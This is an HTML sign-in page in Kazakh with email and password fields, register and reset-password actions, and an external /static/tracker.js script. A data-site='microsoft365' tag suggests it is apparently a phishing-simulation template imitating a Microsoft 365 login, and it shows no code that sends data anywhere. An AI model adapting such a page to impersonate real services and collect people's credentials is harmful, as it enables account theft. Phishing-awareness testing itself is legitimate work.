<!DOCTYPE html>
<html lang="kk">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Жүйеге кіру</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #F3F4F6;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      padding: 2rem 1rem;
    }

    .card {
      background: #ffffff;
      border: 1px solid #E5E7EB;
      border-radius: 16px;
      padding: 2.5rem 2rem;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.06);
    }

    .logo {
      width: 48px;
      height: 48px;
      border-radius: 12px;
      background: #4F46E5;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 1.5rem;
    }

    .logo svg {
      width: 26px;
      height: 26px;
      fill: white;
    }

    h1 {
      font-size: 22px;
      font-weight: 600;
      text-align: center;
      color: #111827;
      margin-bottom: 0.4rem;
    }

    .subtitle {
      font-size: 14px;
      color: #6B7280;
      text-align: center;
      margin-bottom: 2rem;
    }

    label {
      display: block;
      font-size: 13px;
      font-weight: 500;
      color: #374151;
      margin-bottom: 6px;
      margin-top: 1rem;
    }

    label:first-of-type { margin-top: 0; }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 11px 14px;
      font-size: 15px;
      border: 1px solid #D1D5DB;
      border-radius: 10px;
      background: #F9FAFB;
      color: #111827;
      outline: none;
      transition: border-color 0.15s, box-shadow 0.15s;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #4F46E5;
      background: #ffffff;
      box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.12);
    }

    input::placeholder { color: #9CA3AF; }

    .btn-primary {
      width: 100%;
      margin-top: 1.5rem;
      padding: 12px;
      font-size: 15px;
      font-weight: 600;
      background: #4F46E5;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.15s, transform 0.1s;
    }

    .btn-primary:hover { background: #4338CA; }
    .btn-primary:active { transform: scale(0.98); }

    .divider {
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 1.25rem 0;
      color: #9CA3AF;
      font-size: 13px;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #E5E7EB;
    }

    .btn-secondary {
      width: 100%;
      padding: 11px;
      font-size: 14px;
      color: #374151;
      background: #F9FAFB;
      border: 1px solid #E5E7EB;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.15s;
    }

    .btn-secondary:hover { background: #F3F4F6; }

    .footer {
      margin-top: 1.5rem;
      text-align: center;
      font-size: 13px;
      color: #9CA3AF;
    }

    .footer a {
      color: #4F46E5;
      text-decoration: none;
      font-weight: 500;
    }

    .footer a:hover { text-decoration: underline; }
  </style>
</head>

<body data-site="microsoft365">
  <div class="card">

    <div class="logo">
      <svg viewBox="0 0 24 24">
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10
                 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3
                 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3
                 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03
                 -1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6
                 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
      </svg>
    </div>

    <h1>Жүйеге кіру</h1>
    <p class="subtitle">Аккаунтыңызға кіріңіз</p>

    <label for="login">Электрондық пошта</label>
    <input type="text" id="login" placeholder="example@mail.com" />

    <label for="password">Құпия сөз</label>
    <input type="password" id="password" placeholder="••••••••" />

    <button class="btn-primary" onclick="loginAttempt()">Кіру</button>

    <div class="divider">немесе</div>

    <button class="btn-secondary" onclick="clickButton('register_clicked')">Тіркелу</button>

    <p class="footer">
      Құпия сөзді ұмыттыңыз ба?
      <a href="#" onclick="clickButton('restore_clicked')">Қалпына келтіру</a>
    </p>

  </div>

  <script src="/static/tracker.js"></script>
</body>
</html>
